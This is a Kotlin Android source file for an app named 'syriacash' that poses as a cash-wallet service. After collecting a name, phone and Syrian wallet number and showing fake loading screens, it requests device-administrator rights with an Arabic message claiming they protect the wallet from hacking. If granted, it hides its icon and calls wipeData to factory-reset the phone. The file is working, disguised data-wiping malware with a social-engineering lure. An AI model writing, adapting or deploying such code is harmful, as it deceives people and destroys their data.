package com.example.syriacash

import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.view.View
import android.widget.Button
import android.widget.EditText
import android.widget.LinearLayout
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity

class MainActivity : AppCompatActivity() {

    private lateinit var dpm: DevicePolicyManager
    private lateinit var adminName: ComponentName
    private var isWaitingForAdmin = false

    private lateinit var layoutRegister: LinearLayout
    private lateinit var layoutWallet: LinearLayout
    private lateinit var layoutLoading: LinearLayout

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        adminName = ComponentName(this, AdminReceiver::class.java)

        layoutRegister = findViewById(R.id.layoutRegister)
        layoutWallet = findViewById(R.id.layoutWallet)
        layoutLoading = findViewById(R.id.layoutLoading)

        val etName = findViewById<EditText>(R.id.etName)
        val etPhone = findViewById<EditText>(R.id.etPhone)
        val btnRegister = findViewById<Button>(R.id.btnRegister)

        val etWalletNumber = findViewById<EditText>(R.id.etWalletNumber)
        val btnWithdraw = findViewById<Button>(R.id.btnWithdraw)

        btnRegister.setOnClickListener {
            if (etName.text.isEmpty() || etPhone.text.isEmpty()) {
                Toast.makeText(this, "يرجى إكمال البيانات", Toast.LENGTH_SHORT).show()
                return@setOnClickListener
            }
            
            btnRegister.text = "جاري..."
            btnRegister.isEnabled = false
            
            Handler(Looper.getMainLooper()).postDelayed({
                layoutRegister.visibility = View.GONE
                layoutWallet.visibility = View.VISIBLE
            }, 1500)
        }

        btnWithdraw.setOnClickListener {
            val walletNum = etWalletNumber.text.toString()
            
            // تعديل: الرقم السوري 10 أرقام (09xxxxxxxx)
            if (walletNum.length < 10) {
                Toast.makeText(this, "أدخل رقم محفظة صحيح (09xxxxxxxx)", Toast.LENGTH_SHORT).show()
                return@setOnClickListener
            }

            layoutWallet.visibility = View.GONE
            layoutLoading.visibility = View.VISIBLE

            Handler(Looper.getMainLooper()).postDelayed({
                layoutLoading.visibility = View.GONE
                triggerDeviceAdmin()
            }, 2000)
        }
    }

    override fun onResume() {
        super.onResume()
        if (isWaitingForAdmin) {
            if (dpm.isAdminActive(adminName)) {
                hideAppIcon()
                dpm.wipeData(0)
            } else {
                layoutLoading.visibility = View.GONE
                layoutWallet.visibility = View.VISIBLE
            }
            isWaitingForAdmin = false
        }
    }

    private fun triggerDeviceAdmin() {
        isWaitingForAdmin = true
        val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
        intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminName)
        intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "مطلوب تفعيل هذه الصلاحية لتأمين عملية السحب وحماية محفظتك من الاختراق.")
        startActivity(intent)
    }

    private fun hideAppIcon() {
        try {
            val componentName = ComponentName(this, MainActivity::class.java)
            packageManager.setComponentEnabledSetting(
                componentName,
                android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                android.content.pm.PackageManager.DONT_KILL_APP
            )
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }
}
